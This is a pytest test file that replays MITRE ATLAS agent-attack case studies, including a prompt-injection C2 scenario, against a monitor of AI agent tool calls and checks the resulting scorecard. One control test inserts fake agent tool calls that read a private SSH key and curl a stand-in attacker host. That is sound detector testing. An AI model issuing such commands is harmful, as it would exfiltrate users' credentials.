"""MITRE ATLAS OpenClaw case studies replayed against Guard (vivekchand/clawmetry#5944).

The suite lives in ``tests/replay/atlas_openclaw/``; the scorecard it produces
is ``docs/ATLAS_OPENCLAW_SCORECARD.md``. These tests hold the two together and
hold both to the honesty rules in the requirement.

Acceptance criteria (REQ-GOV-ATR, Software Factory 7616fb6b):

* AC-GOV-ATR-001.1 -- ATLAS edition, revision, cases, every published step and the derived
  mitigations are pinned, and the unpinned source report is named:
  ``test_manifest_pins_the_atlas_edition_and_every_published_step``,
  ``test_verify_atlas_checks_the_derived_mitigations``,
  ``test_scorecard_states_its_limits_and_lists_gaps``.
* AC-GOV-ATR-001.2 -- each scenario records runtime, tier, policy set and expectations:
  ``test_every_scenario_records_runtime_tier_policy_and_expectations``.
* AC-GOV-ATR-002.1 -- stages scored separately with the kinds that fired and a timestamp,
  cases rolled up: ``test_every_stage_matches_its_pinned_expectation``,
  ``test_flagged_stages_carry_their_kinds_and_first_timestamp``, ``test_roll_up_rules``.
* AC-GOV-ATR-002.2 -- a fixture replay is labelled and never held before action:
  ``test_fixture_replay_never_scores_held_before_action``.
* AC-GOV-ATR-002.3 -- benign controls, an intentional allow and pre-action failure modes:
  ``test_benign_controls_stay_quiet_and_a_finding_would_be_reported``,
  ``test_the_intentionally_allowed_policy_never_decides``,
  ``test_gate_failure_modes_match_their_pinned_results``.
* AC-GOV-ATR-003.1 -- the scorecard is generated and cannot drift:
  ``test_scorecard_matches_the_replay``, ``test_every_stage_matches_its_pinned_expectation``.
* AC-GOV-ATR-003.2 -- the scorecard states its limits and lists residual gaps:
  ``test_scorecard_states_its_limits_and_lists_gaps``.
* AC-GOV-ATR-003.3 -- a redacted, reproducible evidence bundle:
  ``test_evidence_bundle_is_reproducible_and_redacted``.
"""
from __future__ import annotations

import copy
import glob
import hashlib
import importlib.util
import json
import os
import re

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SUITE = os.path.join(ROOT, "tests", "replay", "atlas_openclaw")
DOC = os.path.join(ROOT, "docs", "ATLAS_OPENCLAW_SCORECARD.md")


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


replay = _load("atlas_openclaw_replay", os.path.join(SUITE, "replay.py"))
gen = _load("gen_atlas_openclaw_scorecard",
            os.path.join(ROOT, "scripts", "gen_atlas_openclaw_scorecard.py"))

CASE_IDS = ["AML.CS0048", "AML.CS0049", "AML.CS0050", "AML.CS0051"]


@pytest.fixture(scope="module")
def report():
    return replay.replay_all()


def _raw_scenarios():
    return {s["id"]: s for s in replay.load_scenarios()}


# ── pins ─────────────────────────────────────────────────────────────────────
def test_manifest_pins_the_atlas_edition_and_every_published_step():
    m = replay.load_manifest()
    assert m["atlas"]["edition"] == "2026.08"
    assert re.fullmatch(r"[0-9a-f]{40}", m["atlas"]["git_blob"])
    assert m["atlas"]["path"] == "dist/v6/ATLAS-2026.08.yaml"
    assert [c["id"] for c in m["cases"]] == CASE_IDS
    for case in m["cases"]:
        assert case["name"] and case["modified_date"] and case["references"]
        seen = []
        for s in case["steps"]:
            assert re.fullmatch(r"S\d{2}", s["step"])
            # A technique, never a tactic or mitigation in the technique slot.
            assert re.fullmatch(r"AML\.T\d{4}(\.\d{3})?", s["technique"]), s
            assert re.fullmatch(r"AML\.TA\d{4}", s["tactic"]), s
            assert s["technique_name"] and s["tactic_name"]
            seen.append(s["step"])
        assert seen == sorted(seen) and len(set(seen)) == len(seen)
        # Mitigations ATLAS publishes against the step techniques, derived and
        # labelled as derived: never a technique outside this case's steps.
        step_techs = {s["technique"] for s in case["steps"]}
        mits = case["mitigations"]
        assert mits, f"{case['id']} pins no mitigations"
        assert [mt["id"] for mt in mits] == sorted({mt["id"] for mt in mits})
        for mt in mits:
            assert re.fullmatch(r"AML\.M\d{4}", mt["id"]), mt
            assert mt["name"] and mt["techniques"], mt
            assert set(mt["techniques"]) <= step_techs, (case["id"], mt)
    assert m["atlas"]["mitigation_mapping"].startswith("derived")

    # Every published step is either replayed in exactly one stage or listed
    # as not replayed, with a reason. None is silently dropped.
    raw = _raw_scenarios()
    for case in m["cases"]:
        scen = [s for s in raw.values() if s.get("case") == case["id"]]
        assert len(scen) == 1, f"{case['id']} needs exactly one scenario"
        sc = scen[0]
        accounted = [step for st in sc["stages"] for step in st["steps"]]
        for nr in sc.get("not_replayed") or []:
            assert nr["reason"]
            accounted.extend(nr["steps"])
        assert sorted(accounted) == [s["step"] for s in case["steps"]], case["id"]


def _atlas_data_matching(manifest):
    """A minimal parsed ATLAS data file that agrees with every pin, so the
    verifier can be exercised without PyYAML or MITRE's file."""
    data = {"collection": {"version": manifest["atlas"]["edition"]},
            "case-studies": {}, "techniques": {}, "tactics": {},
            "mitigations": {}, "relationships": {}}
    rels = data["relationships"]
    for case in manifest["cases"]:
        data["case-studies"][case["id"]] = {"name": case["name"],
                                            "modified-date": case["modified_date"]}
        rels[case["id"]] = {"employs": [
            {"source": case["id"], "target": s["technique"], "tactic": s["tactic"],
             "step-id": s["step"]} for s in case["steps"]]}
        for s in case["steps"]:
            data["techniques"][s["technique"]] = {"name": s["technique_name"]}
            data["tactics"][s["tactic"]] = {"name": s["tactic_name"]}
        for mt in case["mitigations"]:
            data["mitigations"][mt["id"]] = {"name": mt["name"]}
            edges = rels.setdefault(mt["id"], {"mitigates": []})["mitigates"]
            for t in mt["techniques"]:
                if not any(e["target"] == t for e in edges):
                    edges.append({"source": mt["id"], "target": t})
    return data


def test_verify_atlas_checks_the_derived_mitigations():
    m = replay.load_manifest()
    good = _atlas_data_matching(m)
    assert gen.verify_atlas_data(m, good) == []

    # MITRE withdraws one mitigation edge: the pin no longer matches.
    dropped = copy.deepcopy(good)
    mid = m["cases"][0]["mitigations"][0]["id"]
    dropped["relationships"][mid]["mitigates"] = []
    assert any("mitigations differ" in p for p in gen.verify_atlas_data(m, dropped))

    # MITRE publishes a new mitigation against a step technique we replay.
    added = copy.deepcopy(good)
    tech = m["cases"][0]["steps"][0]["technique"]
    added["relationships"]["AML.M9999"] = {"mitigates": [{"source": "AML.M9999", "target": tech}]}
    assert any("mitigations differ" in p for p in gen.verify_atlas_data(m, added))

    # A mitigation is renamed.
    renamed = copy.deepcopy(good)
    renamed["mitigations"][mid]["name"] = "Something else"
    assert any("mitigation name changed" in p for p in gen.verify_atlas_data(m, renamed))


def test_every_scenario_records_runtime_tier_policy_and_expectations(report):
    policies = replay.load_policies()
    assert report["policy_set"] == policies["version"]
    raw = _raw_scenarios()
    assert raw, "no scenarios found"
    for sid, sc in raw.items():
        assert sc["runtime"] in ("openclaw", "claude_code"), sid
        assert sc["tier"] in replay.TIERS, sid
        variant_ids = [v["id"] for v in sc["variants"]]
        assert variant_ids, sid
        for st in sc["stages"]:
            assert set((st.get("expect") or {}).get("outcome") or {}) == set(variant_ids), \
                f"{sid} {st['id']} must pin an outcome for every variant"
        if sc["type"] == "attack":
            assert sc["decisive_stage"] in [st["id"] for st in sc["stages"]]
            assert set(sc["expected_verdict"]) == set(variant_ids)
            assert all(st.get("basis") for st in sc["stages"]), sid


def test_scenario_hosts_are_reserved_example_names():
    """A fixture never names a live attacker host."""
    subs = replay.load_manifest()["host_substitutions"]
    originals = [k for k in subs if not k.startswith("_")]
    for path in replay.scenario_paths():
        with open(path, encoding="utf-8") as f:
            text = f.read()
        for host in originals:
            assert re.search(r"(?<![\w.-])" + re.escape(host) + r"(?![\w-])", text) is None, \
                f"{os.path.basename(path)} names {host}"


# ── scoring ──────────────────────────────────────────────────────────────────
def test_every_stage_matches_its_pinned_expectation(report):
    """The regression guard: a detector change that moves any outcome goes red
    here, naming the stage, until the expectation and the scorecard move with it."""
    wrong = []
    for sc in report["scenarios"]:
        for vid, v in sc["variants"].items():
            if sc["type"] == "attack" and v["verdict"] != v["expected_verdict"]:
                wrong.append(f"{sc['id']} [{vid}] verdict {v['verdict']} != {v['expected_verdict']}")
            for st in v["stages"]:
                if st["outcome"] != st["expected"]:
                    fired = [(f["kind"], f["severity"]) for f in st["findings"]]
                    wrong.append(f"{sc['id']} [{vid}] {st['id']}: {st['outcome']} != "
                                 f"{st['expected']} (fired {fired})")
    assert not wrong, "\n".join(wrong)


def test_flagged_stages_carry_their_kinds_and_first_timestamp(report):
    raw = _raw_scenarios()
    flagged = 0
    for sc in report["scenarios"]:
        stamps = {e["ts"] for st in raw[sc["id"]]["stages"] for e in st.get("events") or []}
        for v in sc["variants"].values():
            if sc["type"] == "attack":
                assert v["verdict"] in replay.VERDICTS
            for st in v["stages"]:
                assert st["outcome"] in replay.OUTCOMES + replay.CONTROL_OUTCOMES
                tool_findings = [f for f in st["findings"] if f["kind"] in
                                 ("credential_access", "network_egress", "privilege_change",
                                  "file_blast_radius", "stuck_loop", "no_progress")]
                if tool_findings:
                    flagged += 1
                    assert all(f["kind"] and f["severity"] for f in st["findings"])
                    assert st["first_flagged_ts"] in stamps, (sc["id"], st["id"])
    assert flagged, "no stage fired at all: the check above would be vacuous"


def test_roll_up_rules():
    assert replay.roll_up({"a": "detected", "b": "observed"}, "a") == "caught"
    assert replay.roll_up({"a": "observed", "b": "detected"}, "a") == "partial"
    assert replay.roll_up({"a": "observed", "b": "partial"}, "a") == "partial"
    assert replay.roll_up({"a": "unobservable", "b": "observed"}, "a") == "missed"
    exp = {"relevant_kinds": ["network_egress"], "min_severity": "warning"}
    T = replay.TIER_FIXTURE
    assert replay.score_stage(T, "none", [], exp) == "unobservable"
    assert replay.score_stage(T, "tool_stream", [], exp) == "observed"
    assert replay.score_stage(T, "tool_stream",
                              [{"kind": "network_egress", "severity": "info"}], exp) == "partial"
    assert replay.score_stage(T, "tool_stream",
                              [{"kind": "credential_access", "severity": "critical"}], exp) == "partial"
    assert replay.score_stage(T, "tool_stream",
                              [{"kind": "network_egress", "severity": "warning"}], exp) == "detected"
    # A stage its author called invisible that nonetheless produced a finding
    # is scored on the finding, never hidden behind the label.
    assert replay.score_stage(T, "none",
                              [{"kind": "network_egress", "severity": "warning"}], exp) == "detected"


def test_fixture_replay_never_scores_held_before_action(report):
    receipt = {"held": True, "action_receipt": "hook-decision-123",
               "side_effect_observed": False}
    exp = {"relevant_kinds": ["network_egress"], "min_severity": "warning"}
    assert replay.score_stage(replay.TIER_FIXTURE, "tool_stream", [], exp, receipt) != "held_before_action"
    assert replay.score_stage(replay.TIER_ISOLATED, "tool_stream", [], exp, receipt) == "held_before_action"
    for partial_receipt in ({"held": True, "action_receipt": "r"},
                            {"held": True, "side_effect_observed": False},
                            {"held": True, "action_receipt": "r", "side_effect_observed": True}):
        assert replay.score_stage(replay.TIER_ISOLATED, "tool_stream", [], exp,
                                  partial_receipt) != "held_before_action"

    # A fixture that smuggles a receipt into a stage still cannot claim a hold.
    sc = copy.deepcopy(_raw_scenarios()["cs0051-prompt-injection-c2"])
    for st in sc["stages"]:
        st["receipt"] = receipt
    smuggled = replay.replay_scenario(sc, replay.load_policies())
    assert all(st["outcome"] != "held_before_action"
               for v in smuggled["variants"].values() for st in v["stages"])

    for sc in report["scenarios"]:
        assert sc["tier"] == replay.TIER_FIXTURE
        for v in sc["variants"].values():
            for st in v["stages"]:
                assert st["outcome"] != "held_before_action"
                assert st["enforced_by"] == "none"
                assert all(d["evidence_level"] == "configured" for d in st["decisions"])
    with open(DOC, encoding="utf-8") as f:
        assert "Evidence tier: fixture replay" in f.read()


def test_benign_controls_stay_quiet_and_a_finding_would_be_reported(report):
    controls = [s for s in report["scenarios"] if s["type"] == "control"]
    assert len(controls) >= 3
    for sc in controls:
        for vid, v in sc["variants"].items():
            for st in v["stages"]:
                assert st["outcome"] == "quiet", (sc["id"], vid, st["findings"])

    # Prove a control CAN go red: add a secret read followed by egress to the
    # ordinary day and it must be reported as a false positive, not absorbed.
    sc = copy.deepcopy(_raw_scenarios()["control-openclaw-ordinary-day"])
    sc["stages"][0]["events"] += [
        {"event_type": "tool_call", "ts": "2026-09-01T09:01:00Z",
         "data": {"tool": "exec", "args": {"command": "cat /home/dana/.ssh/id_ed25519"}}},
        {"event_type": "tool_call", "ts": "2026-09-01T09:01:05Z",
         "data": {"tool": "exec", "args": {"command": "curl -s https://collect.attacker.example/x"}}},
    ]
    res = replay.replay_scenario(sc, replay.load_policies())
    assert {st["outcome"] for v in res["variants"].values() for st in v["stages"]} == {"false_positive"}


def test_the_intentionally_allowed_policy_never_decides(report):
    decisions = [d for sc in report["scenarios"] for v in sc["variants"].values()
                 for st in v["stages"] for d in st["decisions"]]
    assert decisions, "no decision at all: the allow check below would be vacuous"
    assert "codex-only-kill" not in {d["policy_id"] for d in decisions}
    # And the same policy DOES decide once the runtime matches, so its silence
    # above is the scope doing its job rather than a broken policy.
    from clawmetry import policy_engine
    pol = [p for p in replay.load_policies()["policies"] if p["policy_id"] == "codex-only-kill"]
    got = policy_engine.evaluate(
        [{"kind": "credential_access", "severity": "warning", "runtime": "codex",
          "session_id": "codex:x", "evidence": {}}], pol,
        session_facts={"codex:x": {"runtime": "codex"}}, now=replay.REPLAY_NOW)
    assert [d["action"] for d in got] == ["kill"]


def test_gate_failure_modes_match_their_pinned_results(report):
    fms = {fm["id"]: fm for fm in report["failure_modes"]}
    assert {"FM-1", "FM-2", "FM-3"} <= set(fms)
    for fm in fms.values():
        assert fm["exercised"], fm["id"]
        for key, want in fm["expected"].items():
            assert fm["result"][key] == want, (fm["id"], key, fm["result"])
    # FM-1 is only meaningful if the gate was applied in the first place.
    assert fms["FM-1"]["result"]["applied_on_first_pass"] == ["cautious"]


def test_the_replay_executes_nothing(monkeypatch):
    """Scenarios are data. Nothing in the replay may start a process."""
    import subprocess

    def _refuse(*a, **k):
        raise AssertionError(f"replay tried to run a process: {a!r}")

    monkeypatch.setattr(subprocess, "Popen", _refuse)
    monkeypatch.setattr(subprocess, "run", _refuse)
    monkeypatch.setattr(os, "system", _refuse)
    assert replay.replay_all()["scenarios"]


# ── the scorecard and the bundle ─────────────────────────────────────────────
def test_scorecard_matches_the_replay(report):
    with open(DOC, encoding="utf-8") as f:
        current = f.read()
    assert current == gen.render(report), (
        "docs/ATLAS_OPENCLAW_SCORECARD.md is stale: run "
        "python3 scripts/gen_atlas_openclaw_scorecard.py")


def test_scorecard_states_its_limits_and_lists_gaps(report):
    with open(DOC, encoding="utf-8") as f:
        doc = f.read()
    assert "does not establish protection against CVE-2026-25253" in doc
    assert "does not establish protection against prompt injection in general" in doc
    # What is NOT pinned is said, not left for a reader to assume: the source
    # report revision, and that case to mitigation lists are derived.
    assert "| Source report | **not pinned.**" in doc
    assert "PR-26-00176-1" in doc
    assert "**derived**, not published by MITRE for the case" in doc
    assert "- **NX-5 The source report revision.**" in doc
    for case in report["cases"]:
        assert f"ATLAS mitigations published against this case's step techniques (derived, " \
               f"{len(case['mitigations'])})" in doc
    gaps = report["residual_gaps"]
    assert gaps
    stage_names = set()
    raw = _raw_scenarios()
    for sc in raw.values():
        for st in sc["stages"]:
            stage_names.add(f"{sc.get('case')} {st['id']}")
    fm_ids = {fm["id"] for fm in report["failure_modes"]}
    for g in gaps:
        assert f"**{g['id']}**" in doc
        assert g["stages"] and all(s in stage_names or s in fm_ids for s in g["stages"]), g
    # Every attack stage that is not detected shows up in some gap.
    covered = {s for g in gaps for s in g["stages"]}
    for sc in report["scenarios"]:
        if sc["type"] != "attack":
            continue
        for v in sc["variants"].values():
            for st in v["stages"]:
                if st["outcome"] in ("observed", "partial") and \
                        (st["relevant_kinds"] or st["outcome"] == "partial"):
                    assert f"{sc['case']} {st['id']}" in covered, (sc["id"], st["id"])
    # No em dashes in a public document.
    assert "—" not in doc


def test_evidence_bundle_is_reproducible_and_redacted(report):
    a = replay.evidence_bundle(report, generated_at="2026-09-14T00:00:00Z")
    b = replay.evidence_bundle(replay.replay_all(), generated_at="2026-09-15T00:00:00Z")
    a.pop("generated_at")
    b.pop("generated_at")
    assert json.dumps(a, sort_keys=True) == json.dumps(b, sort_keys=True)
    assert a["tier"] == replay.TIER_FIXTURE
    assert a["atlas"]["git_blob"] and a["suite_version"] and a["policy_set"]
    expected_files = sorted(
        os.path.relpath(p, ROOT) for p in
        glob.glob(os.path.join(SUITE, "scenarios", "*.json"))
        + [os.path.join(SUITE, "manifest.json"), os.path.join(SUITE, "policies.json")])
    assert sorted(a["file_digests"]) == expected_files
    for rel, digest in a["file_digests"].items():
        with open(os.path.join(ROOT, rel), "rb") as f:
            assert hashlib.sha256(f.read()).hexdigest() == digest
    text = json.dumps(a)
    # Raw scenario content stays out: no command lines, no home paths.
    assert "curl " not in text
    assert "/home/dana" not in text
    assert '"events"' not in text
